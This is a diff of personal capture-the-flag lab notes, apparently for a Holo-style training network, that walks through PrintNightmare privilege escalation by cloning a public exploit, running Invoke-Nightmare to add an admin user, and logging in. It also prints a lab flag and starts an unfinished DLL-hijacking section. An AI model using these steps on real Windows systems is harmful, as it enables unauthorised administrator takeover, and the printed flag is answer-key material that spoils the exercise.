@@ -1,6 +1,6 @@
 Now that we have performed all the enumeration and situational awareness, we can move on to privilege escalation. Looking through our enumeration steps, you may notice a unique application connected to a scheduled task on the endpoint. We can attempt a DLL hijack on this application to escalate privileges, then set up persistence on the endpoint.
 
-From the MITRE ATT&CK framework, DLL Hijacking is defined as "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. [[1]](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution." The AT&CK Technique ID is [T1574](https://attack.mitre.org/techniques/T1574/).  
+From the MITRE ATT&CK framework, DLL Hijacking is defined as *"Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. [[1]](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution."* The AT&CK Technique ID is [T1574](https://attack.mitre.org/techniques/T1574/).  
 
 To utilize DLL Hijacking for privilege escalation, we will need to research the application and known vulnerabilities and DLLs and find a DLL not present on the system we have write access to.  
 
@@ -24,3 +24,71 @@ If there is not any research on the application available, say a proprietary app
 
 ---
 
+# Your job
+
+## Privilege Escalation
+Use a new vulnerability called `Print Nightmare` which was released in June 2021.
+CVE-2021-34527, or PrintNightmare, is a vulnerability in the Windows Print Spooler that allows for a low priv user to escalate to administrator on a local box or on a remote server. More [info](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html).
+
+- Check if the system is likely to be vulnerable.
+	- Open the `services.msc` and check if the “Print Spooler” service is running.
+	
+		![[Task 43 - WERE TAKING OVER THIS DLL!-20241119134107843.webp]]
+		It's vulnerable.
+	- Check the updates on the system, this can be done via PowerShell:
+		`wmic qfe list`
+		
+		![[Task 43 - WERE TAKING OVER THIS DLL!-20241119134419904.webp]]
+		The results show the last update on this system was done on 11/11/2020 which means it is likely to be vulnerable!
+
+- Download the exploit from github to the attcking machine.
+	`git clone https://github.com/calebstewart/CVE-2021-1675`
+
+- Copy the `CVE-2021-1675.ps1` file to PC-FILESRV01. 
+
+> [!tip]
+> If you are using xfreerdp with /drive:share,/home/kali/tools/ you can copy directly into the macHine.
+
+- Run the script through a PowerShell window:
+	PS C:\Users\watamet\Downloads> `Import-Module .\CVE-2021-1675.ps1`
+
+- Run the exploit.
+	PS C:\Users\watamet\Downloads> `Invoke-Nightmare -NewUser "abcuser" -NewPassword "Abc1234!"`
+	![[Task 43 - WERE TAKING OVER THIS DLL!-20241119140151649.webp]]
+
+> [!success]
+> You have an admin user called **abcuser**. It’s useful to note that the password needs to be complex enough to pass the criteria, otherwise the user won’t be added!
+
+- Confirm the user was added.
+	PS C:\Users\watamet\Downloads> `net user abcuser`
+	![[Task 43 - WERE TAKING OVER THIS DLL!-20241119140539946.webp]]
+
+- Connect into the machine with that user, this can be either via evil-winrm or RDP.
+- Go into the Administrators desktop and get the root flag.
+
+
+---
+
+## Flag after rooting PC-FILESRV01
+
+- Go into the Administrators desktop and get the root flag.
+    
+    HOLO{ee7e68a69829e56e1d5b4a73e7ffa5f0}
+    
+- Submit the user flag on Task 4, question 7.
+
+## DLL Hijacking
+
+You need Procmon.exe (Process Monitor) to get the name of the vulnerable application. 
+*"Process Monitor is an advanced monitoring tool for Windows that shows real-time file system, Registry and process/thread activity."*
+
+- Download it from [here](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon).
+- Copy the file to the C:\Windows\Task.
+- Run the application.
+- 
+
+## Answer the questions
+
+> [!question]
+> What is the name of the vulnerable application found on PC-FILESRV01?
+> 
